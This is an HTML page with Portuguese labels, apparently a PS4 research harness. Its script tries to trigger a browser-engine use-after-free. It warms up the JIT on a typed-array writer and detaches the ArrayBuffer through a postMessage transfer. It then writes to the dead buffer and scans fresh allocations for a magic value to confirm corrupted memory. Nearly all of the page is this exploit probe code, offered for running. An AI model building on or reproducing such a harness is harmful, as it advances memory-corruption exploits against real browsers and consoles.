
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>PS4 Research: Sanity & Memory Scan</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Consolas', monospace; padding: 20px; }
        #log { background: #000; border: 1px solid #444; padding: 15px; height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
        .critical { color: #ff3333; font-weight: bold; text-decoration: underline; }
        .warning { color: #ffcc00; }
        .success { color: #33ff33; }
        .btn-container { margin: 15px 0; }
        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px 25px; cursor: pointer; }
        button:hover { background: #004400; }
    </style>
</head>
<body>

    <h2>Harness de Investigação: Neutering Bypass + Memory Scan</h2>
    
    <div class="btn-container">
        <button id="runBtn">Iniciar Varredura de Sanidade</button>
    </div>

    <div id="log">Aguardando início...</div>

    <script>
        const $log = document.getElementById('log');
        function print(msg, cls = "") {
            const div = document.createElement('div');
            div.className = cls;
            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            $log.appendChild(div);
            $log.scrollTop = $log.scrollHeight;
        }

        // Função para induzir otimização JIT
        function jitWriter(ta, value) {
            // Tentativa de forçar escrita direta sem check de acessores
            ta[0] = value;
        }

        async function runSanityTest() {
            $log.textContent = "";
            print("--- INICIANDO TESTE DE SANIDADE ---");

            // 1. Setup do Alvo
            const ab = new ArrayBuffer(0x100);
            const ta = new Uint32Array(ab);
            const MAGIC_VALUE = 0x41424344;

            // 2. Aquecimento JIT (Warm-up)
            print("Fase 1: Aquecendo JIT...");
            for(let i = 0; i < 50000; i++) {
                jitWriter(ta, i);
            }

            // 3. Trigger do Bug de Invariante
            print("Fase 2: Injetando Invariante Impossível...");
            try {
                Reflect.defineProperty(ta, "0", {
                    configurable: true,
                    writable: true
                });
                print("Invariante injetada!", "success");
            } catch(e) {
                print("Falha na definição: " + e.message, "warning");
            }

            // 4. Neutering (Detachment)
            // No PS4, postMessage é a forma mais eficaz de 'matar' o buffer aqui.
            print("Fase 3: Executando Neutering do ArrayBuffer...");
            try {
                window.postMessage(ab, "*", [ab]);
                print("Buffer enviado para neutering.");
            } catch(e) {
                print("Erro no Neutering: " + e.message, "warning");
            }

            // 5. O Teste de Corrupção (Acesso Pós-Morte)
            print("Fase 4: Tentando escrita via JIT no buffer morto...");
            try {
                jitWriter(ta, MAGIC_VALUE);
                
                // Sanidade Crítica: ta.length deve ser 0 se o motor estiver íntegro.
                if (ta.length !== 0) {
                    print("ALERTA: ta.length ainda é " + ta.length + " após o neutering!", "critical");
                } else {
                    print("Sanidade: ta.length é 0 (Comportamento esperado).");
                }
            } catch(e) {
                print("Interrupção de segurança: " + e.message);
            }

            // 6. Varredura de Memória (Heap Spray leve)
            // Se o JIT escreveu em memória morta, o valor pode ter caído em outro objeto.
            print("Fase 5: Varrendo memória adjacente para MAGIC_VALUE...");
            const candidates = [];
            for (let i = 0; i < 2000; i++) {
                // Alocamos novos buffers para ver se algum 'herdou' o MAGIC_VALUE
                const leakCheck = new Uint32Array(new ArrayBuffer(0x100));
                if (leakCheck[0] === MAGIC_VALUE) {
                    print("!!! SUCESSO !!! MAGIC_VALUE encontrado na posição " + i, "critical");
                    print("Isso confirma um Use-After-Free utilizável.", "critical");
                    return;
                }
                candidates.push(leakCheck);
            }

            print("Varredura concluída. Nenhum leak imediato detectado.");
            print("Nota: Se houver um crash de sistema (CE-XXX), o bug é de kernel-level severity.", "warning");
        }

        document.getElementById('runBtn').onclick = runSanityTest;
    </script>
</body>
</html>
